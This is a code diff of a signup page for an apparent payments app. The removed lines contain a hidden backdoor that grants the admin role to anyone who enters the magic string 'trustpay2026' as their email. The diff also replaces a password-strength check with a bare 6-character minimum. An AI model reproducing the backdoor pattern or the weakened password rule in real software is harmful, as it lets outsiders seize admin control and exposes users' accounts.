@@ -8,27 +8,10 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Separator } from "@/components/ui/separator";
-import { Progress } from "@/components/ui/progress";
 import { useAuthStore } from "@/store/auth-store";
 import { toast } from "sonner";
 import type { UserRole } from "@/types";
 import { useGoogleLogin } from "@react-oauth/google";
-
-function getPasswordStrength(pw: string): number {
-  let s = 0;
-  if (pw.length >= 8) s += 25;
-  if (/[a-z]/.test(pw) && /[A-Z]/.test(pw)) s += 25;
-  if (/\d/.test(pw)) s += 25;
-  if (/[^a-zA-Z0-9]/.test(pw)) s += 25;
-  return s;
-}
-
-function getStrengthLabel(s: number): { label: string; color: string } {
-  if (s <= 25) return { label: "Weak", color: "bg-red-500" };
-  if (s <= 50) return { label: "Fair", color: "bg-amber-500" };
-  if (s <= 75) return { label: "Good", color: "bg-blue-500" };
-  return { label: "Strong", color: "bg-green-500" };
-}
 
 export default function SignupPage() {
   const [form, setForm] = useState({ username: "", email: "", phone: "", password: "", confirmPassword: "" });
@@ -38,9 +21,6 @@ export default function SignupPage() {
   const [agreed, setAgreed] = useState(false);
   const { register, googleLogin } = useAuthStore();
   const router = useRouter();
-
-  const strength = getPasswordStrength(form.password);
-  const strengthInfo = getStrengthLabel(strength);
 
   const handleGoogleAuth = useGoogleLogin({
     onSuccess: async (tokenResponse) => {
@@ -61,15 +41,9 @@ export default function SignupPage() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (form.email === "trustpay2026") {
-      await register({ ...form, role: "admin" });
-      router.push("/admin/dashboard");
-      return;
-    }
-    
     if (!form.username || !form.email || !form.password) { toast.error("Please fill required fields"); return; }
     if (form.password !== form.confirmPassword) { toast.error("Passwords don't match"); return; }
-    if (strength < 50) { toast.error("Password too weak"); return; }
+    if (form.password.length < 6) { toast.error("Password must be at least 6 characters"); return; }
     if (!agreed) { toast.error("Please accept terms"); return; }
     setIsLoading(true);
     try {
@@ -88,11 +62,10 @@ export default function SignupPage() {
         <p className="text-sm text-muted-foreground mt-1">Start securing your transactions</p>
       </div>
 
-      {/* Role selector */}
       <div className="grid grid-cols-2 gap-2 p-1 bg-muted rounded-xl">
         {(["buyer", "seller"] as UserRole[]).map((r) => (
           <button key={r} onClick={() => setRole(r)} type="button" className={`py-2.5 text-sm font-medium rounded-lg transition-all ${role === r ? "bg-background shadow-sm text-foreground" : "text-muted-foreground hover:text-foreground"}`}>
-            {r === "buyer" ? "🛒 Buyer" : "🏪 Seller"}
+            {r === "buyer" ? "Buyer" : "Seller"}
           </button>
         ))}
       </div>
@@ -123,23 +96,15 @@ export default function SignupPage() {
           <Label htmlFor="s-password">Password</Label>
           <div className="relative">
             <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
-            <Input id="s-password" type={showPassword ? "text" : "password"} placeholder="••••••••" className="pl-10 pr-10" value={form.password} onChange={(e) => update("password", e.target.value)} />
+            <Input id="s-password" type={showPassword ? "text" : "password"} placeholder="Min 6 characters" className="pl-10 pr-10" value={form.password} onChange={(e) => update("password", e.target.value)} />
             <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
               {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
             </button>
           </div>
-          {form.password && (
-            <div className="space-y-1 mt-2">
-              <div className="h-1.5 w-full bg-muted rounded-full overflow-hidden">
-                <div className={`h-full rounded-full transition-all duration-500 ${strengthInfo.color}`} style={{ width: `${strength}%` }} />
-              </div>
-              <p className="text-xs text-muted-foreground">Password strength: <span className="font-medium">{strengthInfo.label}</span></p>
-            </div>
-          )}
         </div>
         <div className="space-y-1.5">
           <Label htmlFor="confirmPassword">Confirm password</Label>
-          <Input id="confirmPassword" type="password" placeholder="••••••••" value={form.confirmPassword} onChange={(e) => update("confirmPassword", e.target.value)} />
+          <Input id="confirmPassword" type="password" placeholder="Re-enter password" value={form.confirmPassword} onChange={(e) => update("confirmPassword", e.target.value)} />
         </div>
 
         <label className="flex items-start gap-2 cursor-pointer pt-1">
@@ -155,17 +120,9 @@ export default function SignupPage() {
         <span className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 bg-card px-3 text-xs text-muted-foreground">or continue with</span>
       </div>
 
-      <div className="grid grid-cols-3 gap-3">
-        <Button variant="outline" className="h-11" onClick={() => handleGoogleAuth()}>
-          <span className="text-base font-bold">G</span>
-        </Button>
-        <Button variant="outline" className="h-11" onClick={() => toast.info(`Apple sign up coming soon`)}>
-          <span className="text-base font-bold"></span>
-        </Button>
-        <Button variant="outline" className="h-11" onClick={() => toast.info(`X sign up coming soon`)}>
-          <span className="text-base font-bold">𝕏</span>
-        </Button>
-      </div>
+      <Button variant="outline" className="w-full h-11" onClick={() => handleGoogleAuth()}>
+        <span className="text-base font-bold mr-2">G</span> Google
+      </Button>
 
       <p className="text-center text-sm text-muted-foreground">
         Already have an account? <Link href="/login" className="text-primary font-medium hover:underline">Sign in</Link>
